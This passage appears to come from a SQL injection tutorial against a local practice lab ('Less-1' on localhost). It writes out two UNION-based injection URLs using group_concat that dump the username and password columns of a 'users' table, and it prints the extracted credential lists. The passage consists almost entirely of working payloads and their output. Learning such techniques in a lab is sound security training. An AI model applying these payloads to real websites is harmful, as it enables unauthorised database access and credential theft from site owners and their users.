Getting data from a table



Now we can get the data for instance from “users” table. We know the name of columns, so we can use them to get the data.

a) Get data from a column.

URL: http://localhost/Less-1/?id=-1' UNION select 1,group_concat(username),3 from users --+



Result: “Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4”

b) Getting data from 2 columns.

URL: http://localhost/Less-1/?id=-1' UNION select 1,group_concat(username), group_concat(password) from users --+



Result:
Usernames: “Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4”.
Passwords: "Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4"
